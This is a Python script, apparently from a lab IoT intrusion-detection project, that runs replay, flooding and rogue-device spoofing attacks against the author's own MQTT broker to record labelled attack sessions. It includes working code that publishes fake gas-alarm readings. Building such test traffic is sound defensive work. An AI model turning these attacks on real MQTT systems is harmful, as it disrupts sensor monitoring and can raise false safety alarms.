"""
Controlled network attacks against YOUR OWN lab MQTT broker, for recording
labelled attack sessions and live demos. Do not point this at any broker you
don't own.

  python experiments/attacks.py replay   # capture real readings, then resend them unchanged
  python experiments/attacks.py flood    # publish far faster than the real nodes
  python experiments/attacks.py rogue    # publish fake readings as an unknown device

Options: --broker (default the Pi, 192.168.1.30), --seconds (default 60).
"""

import json
import time
import random
import argparse

import paho.mqtt.client as mqtt

DEFAULT_BROKER = "192.168.1.30"


def connect(broker, port, client_id):
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=client_id)
    client.connect(broker, port, 60)
    client.loop_start()
    return client


def replay(client, seconds, capture_sec=5.0):
    captured = []
    client.on_message = lambda c, u, msg: captured.append((msg.topic, msg.payload))
    client.subscribe("iot/#")
    print(f"[replay] Capturing real traffic for {capture_sec:.0f}s...")
    time.sleep(capture_sec)
    client.unsubscribe("iot/#")
    if not captured:
        print("[replay] Nothing captured. Is the collector publishing?")
        return
    print(f"[replay] Captured {len(captured)} messages; replaying them for {seconds}s")
    end = time.time() + seconds
    while time.time() < end:
        for topic, payload in captured:
            client.publish(topic, payload)
            time.sleep(0.5)
            if time.time() >= end:
                break


def flood(client, seconds, rate=50):
    print(f"[flood] Publishing {rate} msg/s for {seconds}s")
    end = time.time() + seconds
    n = 0
    while time.time() < end:
        n += 1
        # Unique payloads, so this shows up as volume rather than as replays.
        client.publish("iot/arduino_1/sensor_reading", json.dumps({
            "device": "arduino_1", "event": "sensor_reading", "mq135_raw": 200 + n % 5,
            "distance_cm": 50.0, "ir": 0, "ir_count": 0, "uptime_ms": n,
        }))
        time.sleep(1 / rate)


def rogue(client, seconds):
    print(f"[rogue] Publishing fake gas alarms as 'rogue_node' for {seconds}s")
    end = time.time() + seconds
    while time.time() < end:
        client.publish("iot/rogue_node/sensor_reading", json.dumps({
            "device": "rogue_node", "event": "sensor_reading",
            "mq135_raw": random.randint(850, 1000), "uptime_ms": int(time.time() * 1000),
        }))
        time.sleep(1)


def main():
    parser = argparse.ArgumentParser(description="Lab-only MQTT attack generator")
    parser.add_argument("attack", choices=["replay", "flood", "rogue"])
    parser.add_argument("--broker", default=DEFAULT_BROKER)
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--seconds", type=int, default=60)
    args = parser.parse_args()

    client = connect(args.broker, args.port, f"lab_attack_{args.attack}")
    try:
        {"replay": replay, "flood": flood, "rogue": rogue}[args.attack](client, args.seconds)
    except KeyboardInterrupt:
        print("\nStopped.")
    finally:
        client.loop_stop()
        client.disconnect()
    print("Done.")


if __name__ == "__main__":
    main()
